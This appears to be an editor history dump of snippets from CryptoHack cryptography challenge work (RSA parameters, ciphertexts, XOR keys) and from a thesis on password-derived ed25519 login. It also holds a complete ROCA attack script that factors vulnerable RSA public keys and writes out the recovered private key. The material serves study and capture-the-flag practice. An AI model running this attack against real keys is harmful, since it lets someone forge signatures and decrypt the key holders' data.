	p = 1475979915214180235084898622737381736312066145333169775147771216478570297878078949377407337049389289382748507531496480477281264838760259191814463365330269540496961201113430156902396093989090226259326935025281409614983499388222831448598601834318536230923772641390209490231836446899608210795482963763094236630945410832793769905399982457186322944729636418890623372171723742105636440368218459649632948538696905872650486914434637457507280441823676813517852099348660847172579408422316678097670224011990280170474894487426924742108823536808485072502240519452587542875349976558572670229633962575212637477897785501552646522609988869914013540483809865681250419497686697771008
98a448b6bbcd080909d235e5da5e9d56|file:///home/neo/cryptohack/rsa/prime2/ciphertext.txt|1|1|V|text
	249d72cd1d287b1a15a3881f2bff5788bc4bf62c789f2df44d88aae805b54c9a94b8944c0ba798f70062b66160fee312b98879f1dd5d17b33095feb3c5830d28
1f536a602da34dc047508113902df18c|file:///home/neo/cryptohack/rsa/prime2/fast_primes.py|61|22|v|python
	'rsa/prime2/key.pem'
d18878980e2aa55d09393b88a2545d32|file:///home/neo/cryptohack/rsa/prime2/fast_primes.py|61|1|V|python
	key = RSA.import_key(key_file.read())
	print(key)
363b77ef875077ef04dd8dc0f1964b68|file:///home/neo/cryptohack/rsa/prime2/fast_primes.py|62|1|V|python
	print(key)
501971546140ae6cb1666d9d7a81d99c|file:///home/neo/cryptohack/rsa/prime2/roca/src/roca.py|5|1|V|python
	# from sage.doctest.util import Timer                   # Benchmarking and timing attack
	# from sage.all_cmdline import *                        # Used for coppersmith
edb49e81c757dad19347df13699de96b|file:///home/neo/cryptohack/rsa/prime2/roca/src/roca.py|1|1|V|python
	#! /usr/bin/python
25d543d446c590eef4f4740b3743e41e|file:///home/neo/cryptohack/rsa/prime2/roca/src/roca.py|1|1|V|python
	#!/usr/bin/env sage -python
	# -*- coding: utf-8 -*-
	
	import sys
	import argparse                                       # Arguments parsing (key file)
	from Crypto.PublicKey import RSA                      # Key parsing
	from sage import *                        # Used for coppersmith
	import multiprocessing                                # Parrallelisation of the attack
	from decimal import Decimal                           # Arbitrary length floating-point calculation
	import humanfriendly                                  # Print nice time
	from math import log
	
	# https://github.com/crocs-muni/roca
	from detect import RocaFingerprinter                  # Test if key is vulnerable
	
	# Hardcoded parameters for efficiency
	# Found using params.py
	param = \
	{
	  512: {
	    "n": 39,
	    "a_max": 62,
	    "k_max": 37,
	    "M": 0x924cba6ae99dfa084537facc54948df0c23da044d8cabe0edd75bc6,
	    "M_prime": 0x1b3e6c9433a7735fa5fc479ffe4027e13bea,
	    "m": 5,
	    "t": 6,
	    "c_a": 0x80000
	  },
	  1024: {
	    "n": 71,
	    "a_max": 134,
	    "k_max": 37,
	    "M": 0x7923ba25d1263232812ac930e9683ac0b02180c32bae1d77aa950c4a18a4e660db8cc90384a394940593408f192de1a05e1b61673ac499416088382,
	    "M_prime": 0x24683144f41188c2b1d6a217f81f12888e4e6513c43f3f60e72af8bd9728807483425d1e,
	    "m": 4,
	    "t": 5,
	    "c_a": 0x40000000
	  },
	  2048: {
	    "n": 126,
	    "a_max": 434,
	    "k_max": 53,
	    "M": 0x7cda79f57f60a9b65478052f383ad7dadb714b4f4ac069997c7ff23d34d075fca08fdf20f95fbc5f0a981d65c3a3ee7ff74d769da52e948d6b0270dd736ef61fa99a54f80fb22091b055885dc22b9f17562778dfb2aeac87f51de339f71731d207c0af3244d35129feba028a48402247f4ba1d2b6d0755baff6,
	    "M_prime": 0x16928dc3e47b44daf289a60e80e1fc6bd7648d7ef60d1890f3e0a9455efe0abdb7a748131413cebd2e36a76a355c1b664be462e115ac330f9c13344f8f3d1034a02c23396e6,
	    "m": 7,
	    "t": 8,
	    "c_a": 0x400000000
	  }
	}
	
	# https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage
	def coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX):
	    """
	    Coppersmith revisited by Howgrave-Graham
	    
	    finds a solution if:
	    * b|N, b >= N^beta , 0 < beta <= 1
	    * |x| < XX
	    """
	    #
	    # init
	    #
	    dd = pol.degree()
	    nn = dd * mm + tt
	    
	    #
	    # checks
	    #
	    if not 0 < beta <= 1 :
	        raise ValueError("beta should belongs in (0, 1]")
	
	    if not pol.is_monic():
	        raise ArithmeticError("Polynomial must be monic.")
	
	    
	    #
	    # Coppersmith revisited algo for univariate
	    #
	
	    # change ring of pol and x
	    polZ = pol.change_ring(ZZ)
	    x = polZ.parent().gen()
	
	    # compute polynomials
	    gg = []
	    for ii in range(mm):
	        for jj in range(dd):
	            gg.append((x * XX)**jj * N**(mm - ii) * polZ(x * XX)**ii)
	    for ii in range(tt):
	        gg.append((x * XX)**ii * polZ(x * XX)**mm)
	    
	    # construct lattice B
	    BB = Matrix(ZZ, nn)
	    
	    for ii in range(nn):
	        for jj in range(ii+1):
	            BB[ii, jj] = gg[ii][jj]
	
	    # LLL
	    BB = BB.LLL(early_red=True, use_siegel=True)
	
	    # transform shortest vector in polynomial    
	    new_pol = 0
	    for ii in range(nn):
	        new_pol += x**ii * BB[0, ii] / XX**ii
	
	    # factor polynomial
	    potential_roots = new_pol.roots()
	
	    return [i[0] for i in potential_roots]
	
	def benchmark(N, cores):
	  
	  # Key is not always of perfect size, infer from size
	  keylength = int(log(N, 2))
	  if keylength < 1000 :
	    keylength = 512
	  elif  keylength < 2000 :
	    keylength = 1024 
	  elif keylength < 4000 :
	    keylength = 2048 
	  else:
	    keylength = 4096 
	  print ("[+] RSA-%i key" % keylength)
	  
	  # Define parameters for coppersmith
	  M_prime = param[keylength]['M_prime']
	  beta = 0.5 
	  mm = param[keylength]['m']
	  tt = param[keylength]['t']
	  c_prime = discrete_log(N, Mod(65537, M_prime))
	  ord_prime = Zmod(M_prime)(65537).multiplicative_order()
	  start = floor(c_prime/2)
	  top = (c_prime + ord_prime)/2
	  XX = int((2*pow(N, Decimal(beta))) / M_prime) 
	
	  print ("[+] N = %i" % N)
	  print ("[+] c' = %i" % c_prime)
	  
	  # Construct polynomial
	  a_prime = start
	  m_inv = int(inverse_mod(M_prime, N))
	  k_tmp = int(pow(65537, a_prime, M_prime))
	  known_part_pol = int(k_tmp * m_inv)
	  F = PolynomialRing(Zmod(N), implementation='NTL', names=('x',))
	  (x,) = F._first_ngens(1)
	  pol = x + known_part_pol
	  
	  # Time coppersmith
	  timer = Timer()
	  timer.start()
	  roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)
	  coppersmith_time = timer.stop().cputime
	  
	  print ("[+] Time for 1 coppersmith iteration: %s" % humanfriendly.format_timespan(coppersmith_time))
	
	  # Estimate time needed
	  total = (((top - start)/cores) * coppersmith_time)
	  print ("[+] Estimated (worst case) time needed for the attack: %s" % humanfriendly.format_timespan(total))
	
	
	class Worker(multiprocessing.Process):
	     
	  def run(self):
	    try:
	      # Fetch parameters according to key size
	      N, keylength, start, stop, factors_queue, manager = self._args
	      M_prime = param[keylength]['M_prime']
	      beta = 0.5 
	      mm = param[keylength]['m']
	      tt = param[keylength]['t']
	
	      # Uses decimal for arbitrary floating point precision
	      XX = int((2*pow(N, Decimal(beta))) / M_prime) 
	
	      # Bruteforce until p, q are found
	      a_prime = start
	      while a_prime < stop:
	        if manager.finished:
	          break 
	          
	        # Construct polynomial
	        m_inv = int(inverse_mod(M_prime, N))
	        k_tmp = int(pow(65537, a_prime, M_prime))
	        known_part_pol = int(k_tmp * m_inv)
	        F = PolynomialRing(Zmod(N), implementation='NTL', names=('x',))
	        (x,) = F._first_ngens(1)
	        pol = x + known_part_pol
	        
	        # Get roots of polynomial using coppersmith
	        roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)
	         
	        # Check if roots are p, q
	        for root in roots:
	          factor1 = k_tmp + abs(root) * M_prime
	          if mod(N, factor1) == 0:
	            factor2 = N // factor1
	            factors_queue.put((factor1, factor2))
	            print ("[+] p, q", factor1, factor2)
	            manager.finished = True
	            break
	        a_prime += 1
	
	    except KeyboardInterrupt as e:
	        print ("[-] Ctrl+C issued ...")
	        print ("[-] Terminating ...")
	        sys.exit(0)
	
	# Top level of the attack, feeds the queue for the workers
	def roca(N, cpus=1):
	  
	  # Key is not always of perfect size, infer from size
	  keylength = int(log(N, 2))
	  if keylength < 1000 :
	    keylength = 512
	  elif  keylength < 2000 :
	    keylength = 1024 
	  elif keylength < 4000 :
	    keylength = 2048 
	  else:
	    keylength = 4096 
	
	  # Parrallelization options  
	  processes = []
	  manager = multiprocessing.Manager()
	  manager.finished = False
	  factors_queue = multiprocessing.Queue()
	  
	  # bruteforce
	  M_prime = param[keylength]['M_prime']
	  c_prime = discrete_log(N, Mod(65537, M_prime))
	  ord_prime = Zmod(M_prime)(65537).multiplicative_order()
	  
	  top = (c_prime + ord_prime)/2
	  
	  # Spawn processes
	  for i in range(1, cpus+1):
	    if i == 1:
	      start, stop = floor(c_prime/2), floor(top / cpus)
	    else:
	      start, stop = floor(top * (i-1) / cpus), floor(top * i / cpus)    
	    w = Worker(args=(N, keylength, start, stop, factors_queue, manager))
	    w.start()
	    processes.append(w)
	
	  # When factors are found, fetch them from queue
	  factors = factors_queue.get()
	 
	  for i in processes:
	    i.join()
	  
	  # Return p, q in list
	  return [int(f) for f in factors]
	   
	
	# Main entry point, argument parsing
	if __name__ == '__main__':
	  try:
	    # Parse arguments
	    parser = argparse.ArgumentParser(description='Factor ROCA-vulnerable keys', add_help=True)
	    parser.add_argument("public_key_path", type=str, help=\
	  """X.509 subjectPublicKeyInfo DER SEQUENCE (binary or PEM encoding), PKCS#1 RSAPublicKey DER SEQUENCE (binary or PEM encoding), OpenSSH (textual public key only)""")
	    parser.add_argument("-j", "--cores", type=int, nargs='?', default=1, help=\
	  """CPU cores to use for parrallelization""")
	    args = parser.parse_args()
	
	    # Read public key
	    try:
	      print ("[+] Importing key")
	      f = open(args.public_key_path, "rb")
	      pub_key = RSA.importKey(f.read())
	    except e:
	      print ("[-]", e)
	    
	    # https://github.com/crocs-muni/roca
	    fingerprinter = RocaFingerprinter()
	    vulnerable = fingerprinter.has_fingerprint_dlog(pub_key.n)
	
	    if vulnerable:
	      print ("[+] Key is vulnerable!")
	      
	      # Benchmark one coppersmith and provide time estimate
	      benchmark(pub_key.n, args.cores)
	      
	      # Factorize public key
	      timer = Timer()
	      timer.start()
	      p, q = roca(pub_key.n, args.cores)
	      stop = timer.stop().cputime
	
	      print ("[+] Found factors of N:")
	      print ("[+] p =" , p)
	      print ("[+] q =" , q)
	      print ("[+] Took", stop, "s")
	
	      # Construct private key 
	      phi = (p-1) * (q-1)
	      d = int(inverse_mod(pub_key.e, phi))
	      priv_key = RSA.construct((pub_key.n, pub_key.e, d, p, q))
	
	      # Output private key
	      print ("[+] Exporting key to priv.pem")
	      open("priv.pem", "wb").write(priv_key.exportKey())
	    
	    else:
	      print ("[-] Key is not vulnerable to ROCA!")
	
	  except KeyboardInterrupt as e:
	        print ("[-] Ctrl+C issued ...")
	        print ("[-] Terminating ...")
	        sys.exit(0)
c1840bd0405ea6045db6908ed392e26f|file:///home/neo/cryptohack/rsa/prime2/fast_primes.py|65|1|V|python
	print(n)
	print(e)
c8410338ff5bfb0fba4f0ef0d38c0a98|file:///home/neo/cryptohack/rsa/prime2/fast_primes.py|70|1|V|python
	print(e)
f7e29821d5f2002a9dee54ab7809bc7a|file:///home/neo/cryptohack/general/xor/xor.py|47|11|v|python
	 a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313
f7e29821d5f2002a9dee54ab7809bc7a|file:///home/neo/cryptohack/general/xor/xor.py|47|11|v|python
	 a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313
88d630a6c0ee9d71cb9dcafecfe4a2ef|file:///home/neo/cryptohack/general/xor/xor.py|48|19|v|python
	37dcb292030faa90d07eec17e3b1c6d8daf94c35d4c9191a5e1e
88d630a6c0ee9d71cb9dcafecfe4a2ef|file:///home/neo/cryptohack/general/xor/xor.py|48|19|v|python
	37dcb292030faa90d07eec17e3b1c6d8daf94c35d4c9191a5e1e
79056e6651d62404fda893b329e068c4|file:///home/neo/cryptohack/general/xor/xor.py|49|19|v|python
	c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1
79056e6651d62404fda893b329e068c4|file:///home/neo/cryptohack/general/xor/xor.py|49|19|v|python
	c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1
27e9e7b269db740d6abf8dcad243a448|file:///home/neo/cryptohack/general/xor/xor.py|50|33|v|python
	04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf
27e9e7b269db740d6abf8dcad243a448|file:///home/neo/cryptohack/general/xor/xor.py|50|33|v|python
	04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf
60735c1de1a323da0cfc9f44f294190e|file:///home/neo/cryptohack/general/xor/xor.py|47|1|V|python
	    # KEY1 = bytes.fromhex('a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313')
2bb5eafaefe099527aa3ea4c42b107d5|file:///home/neo/cryptohack/general/xor/xor.py|48|21|v|python
	bytes.fromhex('37dcb292030faa90d07eec17e3b1c6d8daf94c35d4c9191a5e1e')
d89e51ab87b820f2da3ee2e46655890e|file:///home/neo/cryptohack/general/xor/xor.py|49|21|v|python
	bytes.fromhex('c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1')
55af0516609ff2d3e97c9f055f913bb7|file:///home/neo/cryptohack/general/xor/xor.py|49|21|v|python
	bytes.fromhex('c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1')
	    # FLAG ^ KEY1 ^ KEY3 ^ KEY2 = 
381fcf3c2aeee3109715bd454aa756e5|file:///home/neo/cryptohack/general/xor/xor.py|50|35|v|python
	bytes.fromhex('04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf')
9b882f65a6ecb6e7b557d127d385cee6|file:///home/neo/cryptohack/output_434cbf2b937bac1177bed299b2049a92.txt|2|28|v|text
	21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771
36f80025e58def1744b2b86fcd3d65cf|file:///home/neo/Documents/thesis/background.tex|20|1|V|tex
	\section{The edwards25519 elliptic curve}
e407be89199f0bc33552cb262e236d35|file:///home/neo/Documents/thesis/architecture.tex|49|133|v|tex
	label={lst:html}
9851e1723636820f7679e42239f599ca|file:///home/neo/Documents/thesis/architecture.tex|49|20|v|tex
	caption={\textbf{Web application html file.} The client is directed to get {\tt auth.js} from a truted source.}
56ee3495a32081ccb6d2376eab391bfa|file:///home/neo/Documents/thesis/architecture.tex|39|238|v|tex
	Listing
3676d55f84497cbeadfc614c1b1b62fc|file:///home/neo/Documents/thesis/architecture.tex|67|41|v|tex
	application
24c0996a1f2b6c1a08a87b62dd9ffcfe|file:///home/neo/Documents/thesis/architecture.tex|68|1|V|tex
	  ...
	  initializeCredentialType({
	    passwordMinLength: 8,
	    passwordProccessMethod: "scrypt_seed_ed25519_keypair",
	  });
	  ...
	    let password = document.getElementById("password");
	  ...
	      /* On registration action */
	    let credential = register(password); 
	  ...
	      /* On login action */
	    let message = document.getElementById("nonce");
	    let credential = authenticate(password, message);
	  ...
	  /* Send credential and other necessary information to the server */ 
54e6ed1b590a590272abb978b61c9d06|file:///home/neo/Documents/thesis/architecture.tex|67|20|v|tex
	caption={\textbf{Web  JavaScript file.} The minimum password length and authentication scheme are initialized. The register and authenticate API calls are called when a user tries to register to or authenticate with the server. auth.js generates the correct credential based on the user's password, and the credential is then sent to the server along with other necessary information, such as the user's username}, label={lst:init_authjs}
dd1a5fa21e1b4d45b16faad5ad20812b|file:///home/neo/Documents/thesis/architecture.tex|66|13|v|tex
	Web application JavaScript file.
85ad53b476f054e9a7a7b7371617e1e7|file:///home/neo/Documents/thesis/implementation.tex|13|20|v|tex
	language=C, caption={, which contains the implementation of existing hash functions. SCRYPT\_End calls the \_crypto\_scrypt function (part of the Tarsnap scrypt implementation) to perform the hashing.}, label={lst:sha256.c}
904bb6a4649f5f2040f7b9b22a0ded94|file:///home/neo/Documents/thesis/implementation.tex|48|28|v|tex
	{{\tt scrypt} hash function called from Firefox using Mozilla's Web Crypto API.}
7dd836536127c4686eefda09fbccd6ff|file:///home/neo/Documents/thesis/implementation.tex|48|20|v|tex
	caption=
830732044584bd4ebdbe5a410fb538e4|file:///home/neo/Documents/thesis/implementation.tex|77|20|v|tex
	caption={}, label={lst:enqueue}
4186edea200c358465b8027c59b4f302|file:///home/neo/Documents/thesis/implementation.tex|105|29|v|tex
	JavaScript code that uses {\tt auth.js} API to generate the credential and submit the reset password form
b459fc915e155d0790e704d250bcc605|file:///home/neo/Documents/thesis/implementation.tex|105|20|v|tex
	caption={}, label={lst:reset_pass}
89a45084c58f5931952a91010e69ff00|file:///home/neo/Documents/thesis/implementation.tex|129|29|v|tex
	Add a nonce as a cookie, as well as in the log in form as a hidden field
2c9e3689200a00d9737844c915e7d796|file:///home/neo/Documents/thesis/implementation.tex|130|20|v|tex
	caption={}, label={lst:nonce}
41fa38d4d150a15c453a16d7baf41429|file:///home/neo/Documents/thesis/implementation.tex|140|915|v|tex
	Listings
b244712bb03d22b4ea0d95196b7da12f|file:///home/neo/Documents/thesis/implementation.tex|144|43|v|tex
	wp\_authenticate\_username\_password, one of the default authentication functions used in WordPress
d42ccbc87cad7a4a74483a7391372760|file:///home/neo/Documents/thesis/implementation.tex|184|42|v|tex
	The {\tt check\_public\_key} function that verifies the submitted signature using the user's stored public key
8935868a7121ce9321fad1b049f717af|file:///home/neo/Documents/thesis/architecture.tex|49|5|V|tex
	    \label{lst:html}
7109f8b15947e30e774fff301aeef68b|file:///home/neo/Documents/thesis/architecture.tex|49|5|v|tex
	\label{lst:html}
713da0ab2f84de0d0f6edd1f961a9e52|file:///home/neo/Documents/thesis/architecture.tex|46|297|v|tex
	lst:html
e13e263aef32e695e1d8cff2bae131d9|file:///home/neo/Documents/thesis/architecture.tex|66|15|v|tex
	\label{lst:init_authjs}
eb7c30825b57b0394df5e9462e0ac4c7|file:///home/neo/Documents/thesis/architecture.tex|46|480|v|tex
	, as depicted in Figure~\ref{lst:init_authjs}
b400ad6cee885af166e02943003b6768|file:///home/neo/Documents/thesis/implementation.tex|11|15|v|tex
	\label{lst:sha256.c}
2f849ff4c97743944ff0f6fc27823548|file:///home/neo/Documents/thesis/implementation.tex|48|5|V|tex
	    \label{lst:webcrypt_scrypt}
b7e49d206f73eab66c68df0c0a9a62f3|file:///home/neo/Documents/thesis/implementation.tex|78|5|V|tex
	    \label{lst:enqueue}
e1fea13e3ff4d9a43f3408192c2cfbb1|file:///home/neo/Documents/thesis/implementation.tex|106|15|v|tex
	\label{lst:reset_pass}
7cde983669c63fed8d97c67542b7386c|file:///home/neo/Documents/thesis/implementation.tex|132|14|v|tex
	}\label{lst:nonce}
3f2beaab149153d797091df43048a053|file:///home/neo/Documents/thesis/implementation.tex|132|15|v|tex
	\label{lst:nonce}
f6be453edb7985cf9eaaaaa288535618|file:///home/neo/Documents/thesis/implementation.tex|147|15|v|tex
	\label{lst:wp_authenticate}
164fcdd30cfd8fcb96299d53231e57c4|file:///home/neo/Documents/thesis/implementation.tex|167|14|v|tex
	}\label{lst:authjs_authenticate}
d93131f8209fbb60ec50277c29ad6379|file:///home/neo/Documents/thesis/implementation.tex|167|15|v|tex
	\label{lst:authjs_authenticate}
ba50bb976c56ea1d5388018ef66893b4|file:///home/neo/Documents/thesis/implementation.tex|190|15|v|tex
	\label{lst:check_public_key}
36554fc1da6baf92e2a6506c796bc9fd|file:///home/neo/cryptohack/general/mathematics/output_479698cde19aaa05d9e9dfca460f5443.txt|1|1|V|text
	p = 101524035174539890485408575671085261788758965189060164484385690801466167356667036677932998889725476582421738788500738738503134356158197247473850273565349249573867251280253564698939768700489401960767007716413932851838937641880157263936985954881657889497583485535527613578457628399173971810541670838543309159139
	ints = [25081841204695904475894082974192007718642931811040324543182130088804239047149283334700530600468528298920930150221871666297194395061462592781551275161695411167049544771049769000895119729307495913024360169904315078028798025169985966732789207320203861858234048872508633514498384390497048416012928086480326832803, 45471765180330439060504647480621449634904192839383897212809808339619841633826534856109999027962620381874878086991125854247108359699799913776917227058286090426484548349388138935504299609200377899052716663351188664096302672712078508601311725863678223874157861163196340391008634419348573975841578359355931590555, 17364140182001694956465593533200623738590196990236340894554145562517924989208719245429557645254953527658049246737589538280332010533027062477684237933221198639948938784244510469138826808187365678322547992099715229218615475923754896960363138890331502811292427146595752813297603265829581292183917027983351121325, 14388109104985808487337749876058284426747816961971581447380608277949200244660381570568531129775053684256071819837294436069133592772543582735985855506250660938574234958754211349215293281645205354069970790155237033436065434572020652955666855773232074749487007626050323967496732359278657193580493324467258802863, 4379499308310772821004090447650785095356643590411706358119239166662089428685562719233435615196994728767593223519226235062647670077854687031681041462632566890129595506430188602238753450337691441293042716909901692570971955078924699306873191983953501093343423248482960643055943413031768521782634679536276233318, 85256449776780591202928235662805033201684571648990042997557084658000067050672130152734911919581661523957075992761662315262685030115255938352540032297113615687815976039390537716707854569980516690246592112936796917504034711418465442893323439490171095447109457355598873230115172636184525449905022174536414781771, 50576597458517451578431293746926099486388286246142012476814190030935689430726042810458344828563913001012415702876199708216875020997112089693759638454900092580746638631062117961876611545851157613835724635005253792316142379239047654392970415343694657580353333217547079551304961116837545648785312490665576832987, 96868738830341112368094632337476840272563704408573054404213766500407517251810212494515862176356916912627172280446141202661640191237336568731069327906100896178776245311689857997012187599140875912026589672629935267844696976980890380730867520071059572350667913710344648377601017758188404474812654737363275994871, 4881261656846638800623549662943393234361061827128610120046315649707078244180313661063004390750821317096754282796876479695558644108492317407662131441224257537276274962372021273583478509416358764706098471849536036184924640593888902859441388472856822541452041181244337124767666161645827145408781917658423571721, 18237936726367556664171427575475596460727369368246286138804284742124256700367133250078608537129877968287885457417957868580553371999414227484737603688992620953200143688061024092623556471053006464123205133894607923801371986027458274343737860395496260538663183193877539815179246700525865152165600985105257601565]
8e335a6de5cbfd0b17f52fbbf993ce7c|file:///home/neo/cryptohack/general/mathematics/mathematics.py|66|13|V|python
	            print(num)
fd9d4aa3048c996e9081b006d57fb8db|file:///home/neo/cryptohack/general/mathematics/mathematics.py|66|1|V|python
	            print(pow(num, (p+1)/y))
032fe46482cdd32f9cab611d453727f4|file:///home/neo/cryptohack/rsa/exponent/wires.txt|3|1|V|text
	Encrypted flag: 20304610279578186738172766224224793119885071262464464448863461184092225736054747976985179673905441502689126216282897704508745403799054734121583968853999791604281615154100736259131453424385364324630229671185343778172807262640709301838274824603101692485662726226902121105591137437331463201881264245562214012160875177167442010952439360623396658974413900469093836794752270399520074596329058725874834082188697377597949405779039139194196065364426213208345461407030771089787529200057105746584493554722790592530472869581310117300343461207750821737840042745530876391793484035024644475535353227851321505537398888106855012746117
b678dc715a9a661da7e72bd49e1188dc|file:///home/neo/cryptohack/rsa/exponent/wires.txt|3|17|v|text
	20304610279578186738172766224224793119885071262464464448863461184092225736054747976985179673905441502689126216282897704508745403799054734121583968853999791604281615154100736259131453424385364324630229671185343778172807262640709301838274824603101692485662726226902121105591137437331463201881264245562214012160875177167442010952439360623396658974413900469093836794752270399520074596329058725874834082188697377597949405779039139194196065364426213208345461407030771089787529200057105746584493554722790592530472869581310117300343461207750821737840042745530876391793484035024644475535353227851321505537398888106855012746117
3e9e5c37cfb57a51abd4fc4d431114d8|file:///home/neo/cryptohack/rsa/exponent/wires.txt|2|26|v|text
	[(21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 106979), (21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 108533), (21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 69557), (21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 97117), (21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 103231)]
888f9914cce77eba177af05a50e0228a|file:///home/neo/cryptohack/rsa/exponent/wires.py|15|2531|v|python
	(21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 
170808423503a6cad059d715fcc511df|file:///home/neo/cryptohack/rsa/exponent/wires.py|15|1275|v|python
	(21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771,
ab1d9cf2023d8450049311b354dd955f|file:///home/neo/cryptohack/rsa/exponent/wires.py|15|1|V|python
	my_key = (N, d)
906b1e179aee2cbf4b8b2e07f5cc6dd2|file:///home/neo/cryptohack/rsa/exponent/wires.py|13|1|V|python
	N = 21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771
ca8ed536f874b7df303d7424ec91f4fe|file:///home/neo/cryptohack/rsa/exponent/wires.txt|1|636|v|text
	 2734411677251148030723138005716109733838866545375527602018255159319631026653190783670493107936401603981429171880504360560494771017246468702902647370954220312452541342858747590576273775107870450853533717116684326976263006435733382045807971890762018747729574021057430331778033982359184838159747331236538501849965329264774927607570410347019418407451937875684373454982306923178403161216817237890962651214718831954215200637651103907209347900857824722653217179548148145687181377220544864521808230122730967452981435355334932104265488075777638608041325256776275200067541533022527964743478554948792578057708522350812154888097)
9ba04df6dbce23ea264a3025e00b2dd9|file:///home/neo/cryptohack/rsa/exponent/wires.py|14|1|V|python
	d = 2734411677251148030723138005716109733838866545375527602018255159319631026653190783670493107936401603981429171880504360560494771017246468702902647370954220312452541342858747590576273775107870450853533717116684326976263006435733382045807971890762018747729574021057430331778033982359184838159747331236538501849965329264774927607570410347019418407451937875684373454982306923178403161216817237890962651214718831954215200637651103907209347900857824722653217179548148145687181377220544864521808230122730967452981435355334932104265488075777638608041325256776275200067541533022527964743478554948792578057708522350812154888097
30f203fa08a3bc07bf7e964d0c4b8e72|file:///home/neo/cryptohack/rsa/exponent/wires.py|13|1|V|python
	# e = 0x10001
85156396493acf6350efcb61d07c01be|file:///home/neo/cryptohack/rsa/exponent/wires.py|20|1|V|python
	print(e*d-1)
7310ed81138b626c4013525cba862ffc|file:///home/neo/cryptohack/rsa/exponent/wires.py|21|1|V|python
	print(N)
e066563c4b4daee2921984a0430add31|file:///home/neo/cryptohack/rsa/exponent/wires.py|21|1|V|python
	# prod = 1
afafe3c061e4ceab1729a596b26330f8|file:///home/neo/cryptohack/rsa/exponent/wires.py|22|1|V|python
	#     prod *= num
f39d6e254e5cdfec400748b29e89da27|file:///home/neo/cryptohack/rsa/exponent/wires.py|23|5|V|python
	    privs.append(pow(multiplicative_inverse(num, phi)))
9ea17f3ba0db4386cbdb852ce8a0e04b|file:///home/neo/cryptohack/rsa/exponent/wires.py|21|1|V|python
	privs = []
6d76e17a3bc760621c7597ec5494cd46|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|7|1|V|python
	for [file if fil] 
b8d9d36b28090d967ba9f4887512e63c|file:///home/neo/cryptohack/rsa/prime2/excerpt.py|11|17|v|python
	RSA.importKey(f.read())
